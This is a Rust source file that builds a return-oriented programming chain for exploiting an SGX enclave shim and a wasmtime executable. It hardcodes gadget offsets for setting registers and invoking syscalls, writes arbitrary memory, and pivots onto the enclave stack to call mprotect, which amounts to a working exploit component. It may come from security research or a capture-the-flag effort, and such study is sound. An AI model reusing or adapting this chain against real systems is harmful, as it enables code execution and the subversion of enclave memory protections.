#[derive(Clone)]
pub struct RopChain {
    sgx_base_address: u64,
    rop_stack_start: u64,
    rop_chain: Vec<u64>,
}

impl RopChain {
    pub fn new(sgx_base_address: u64, rop_stack_start: u64) -> Self {
        Self {
            sgx_base_address,
            rop_stack_start,
            rop_chain: Vec::new(),
        }
    }

    /// Rebase an address within the shim and push it to the rop chain.
    fn push_shim_rebased(&mut self, shim_offset: u64) {
        self.rop_chain.push(self.sgx_base_address + shim_offset);
    }

    /// Rebase an address within the wasmtime exec and push it to the rop chain.
    fn push_exec_rebased(&mut self, exec_offset: u64) {
        self.push_shim_rebased(0x400000 + exec_offset);
    }

    /// Gadget that sets the rdi register.
    fn set_rdi(&mut self, value: u64) {
        self.push_shim_rebased(0x253fd);
        self.rop_chain.push(value);
    }

    /// Gadget that sets the rsi register.
    fn set_rsi(&mut self, value: u64) {
        self.push_shim_rebased(0x262e8);
        self.rop_chain.push(value);
    }

    /// Gadget that sets the rdx register.
    fn set_rdx(&mut self, value: u64) {
        self.push_exec_rebased(0x42d4c1);
        self.rop_chain.push(value);
    }

    /// Gadget that sets the rcx register.
    fn set_rcx(&mut self, value: u64) {
        self.push_shim_rebased(0x25c08);
        self.rop_chain.push(value);
    }

    /// Gadget that sets the rax register.
    fn set_rax(&mut self, value: u64) {
        self.push_shim_rebased(0x26067);
        self.rop_chain.push(value);
    }

    /// Gadget that sets the rbp register.
    fn set_rbp(&mut self, value: u64) {
        self.push_exec_rebased(0x4356ec);
        self.rop_chain.push(value);
    }

    /// Gadget that invokes a syscall.
    fn syscall(&mut self) {
        self.push_exec_rebased(0x3f6909);
    }

    /// Write a value to a given address.
    pub fn write(&mut self, addr: u64, value: u64) {
        self.set_rdi(addr);
        self.set_rcx(value);
        self.push_shim_rebased(0x26603);
    }

    /// Pivot to a new stack.
    fn stack_pivot(&mut self, new_stack: u64) {
        self.set_rbp(new_stack);
        self.push_exec_rebased(0x4356e9);
    }

    /// Pivot to the enclave stack, execute the rop chain created in `f` and
    /// then pivot back.
    ///
    /// This is needed because some syscall handlers pass stack addresses to
    /// `enclu` that need to be in enclave memory.
    pub fn on_enclave_stack(&mut self, f: impl FnOnce(&mut Self)) {
        let start_index = self.rop_chain.len();

        // I'm to lazy to figure out what stack we should pivot back too.
        // So we just create use a fake address, finish the rop chain and see
        // where we end up.
        let mut return_stack_addr = None;

        let mut chain = Self::new(self.sgx_base_address, self.rop_stack_start);
        f(&mut chain);

        loop {
            let mut chain = chain.clone();

            // Return back to the main stack or use a fake address if we don't
            // know the return stack address yet.
            chain.stack_pivot(return_stack_addr.unwrap_or(0));

            // Write the rop chain to the enclave stack.
            let stack = chain.build_stack().collect::<Vec<_>>();
            let start = self.sgx_base_address + 0x3fc000 - stack.len() as u64 * 8;
            for (i, stack_value) in stack.iter().copied().enumerate() {
                self.write(start + i as u64 * 8, stack_value);
            }

            // Pivot the the enclave stack.
            self.stack_pivot(start);

            // If we knew the return stack addr when we created the rop chain,
            // we're done.
            if return_stack_addr.is_some() {
                // Adjust the stack.
                self.rop_chain.push(0);
                return;
            }

            // Otherwise we can now figure out what the return stack address
            // should be.
            return_stack_addr = Some(self.rop_stack_start + self.build_stack().count() as u64 * 8);
            self.rop_chain.truncate(start_index);
        }
    }

    /// Execute a mprotect syscall.
    pub fn mprotect(&mut self, start: u64, len: u64, prot: u8) {
        self.on_enclave_stack(|chain| {
            chain.set_rax(10);
            chain.set_rdi(start);
            chain.set_rsi(len);
            chain.set_rdx(prot as u64);
            chain.syscall();
        });
    }

    /// Run an endless loop.
    pub fn hang(&mut self) {
        self.push_shim_rebased(0x25020);
    }

    /// Push a raw return address to the stack.
    pub fn raw_return_address(&mut self, addr: u64) {
        self.rop_chain.push(addr);
    }

    /// Build the stack.
    pub fn build_stack(&self) -> impl Iterator<Item = u64> + '_ {
        [0].into_iter().chain(self.rop_chain.iter().copied())
    }
}
